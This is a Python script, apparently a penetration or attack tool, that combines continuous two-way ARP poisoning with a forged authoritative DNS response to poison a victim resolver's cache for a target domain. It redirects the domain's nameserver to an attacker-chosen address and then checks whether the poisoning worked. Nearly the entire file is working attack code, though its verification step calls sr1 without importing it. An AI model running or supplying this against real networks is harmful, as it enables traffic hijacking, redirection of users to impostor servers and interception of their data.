from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR
from vars import ccolors
import utils
from arppoison import arppoison
import sys
import threading
import time

# Global variable to hold arguments, which is not ideal but kept for direct translation
globalargs = None

def dnsSpoof(pkt):
    # Py3: qname is in bytes, so we need to encode our string for comparison
    qname_bytes = globalargs.randomSubdomain.encode('utf-8')
    
    if pkt.haslayer(DNSQR) and qname_bytes in pkt[DNSQR].qname and pkt[IP].dst in globalargs.soaIP:
        print(ccolors.OKGREEN + "Intercepted victim's query to authoritative server!" + ccolors.NC)
        
        # return the response to the victim (it will think it's from the authoritative DNS)
        spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                        ns=DNSRR(rrname=globalargs.targetDomain, type='NS', rdata=globalargs.soaDomain[0], ttl=globalargs.ttl), \
                        ar=DNSRR(rrname=globalargs.soaDomain[0], type='A', rdata=globalargs.addressToForge, ttl=globalargs.ttl))
        send(spoof_pkt, verbose=False)
        print(ccolors.OKGREEN + "Spoofed response sent. Victim DNS cache should be poisoned." + ccolors.NC)
        
        # Give a moment for cache to update, then verify
        time.sleep(1)
        
        # Verify if the attack was successful
        verify_pkt = IP(dst=globalargs.victim) / UDP() / DNS(rd=1, qd=DNSQR(qname=globalargs.targetDomain, qtype='A'))
        ans = sr1(verify_pkt, timeout=2, verbose=False)

        if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == globalargs.addressToForge:
            print(ccolors.OKGREEN + "Attack successful! Victim's cache is poisoned." + ccolors.NC)
        else:
            print(ccolors.FAIL + "Attack may have failed. Verification did not return the forged IP." + ccolors.NC)

        # We can exit after one successful spoof
        # In a real scenario, you might want a more robust way to stop sniffing.
        # For this script, we'll exit. A better implementation would use a threading.Event.
        print(ccolors.WARNING + "Terminating..." + ccolors.NC)
        sys.exit(0)

def silent(args):
    global globalargs
    globalargs = args
    
    # ARP poison the victims (two way ARP poisoning)
    print("Performing ARP poisoning...")
    for ip in args.soaIP:
        # Run ARP poison in a loop in a separate thread to maintain it
        poison_thread = threading.Thread(target=maintain_arp, args=(args.victim, ip), daemon=True)
        poison_thread.start()
    
    print("ARP poisoning active.")
    time.sleep(2) # Wait for ARP tables to update

    # send query request to the victim to trigger the attack
    args.randomSubdomain = utils.getRandomSubdomain() + args.targetDomain
    reqPkt = IP(dst=args.victim) / UDP(sport=utils.getRandomPort()) / DNS(rd=1, qd=DNSQR(qname=args.randomSubdomain))
    print(f"Sending trigger query for {args.randomSubdomain} to {args.victim}")
    send(reqPkt, verbose=False)

    # listen for packets on all interfaces (expect query request from victim to authoritative DNS)
    # The filter ensures we only process relevant DNS queries
    bpf_filter = f"udp and port 53 and dst host {' or '.join(args.soaIP)}"
    print(f"Sniffing for DNS query with filter: {bpf_filter}")
    sniff(filter=bpf_filter, prn=dnsSpoof, store=0)

def maintain_arp(victim_ip, target_ip):
    """Continuously sends ARP replies to maintain the poison."""
    while True:
        arppoison(victim_ip, target_ip)
        time.sleep(2) # Send ARP replies every 2 seconds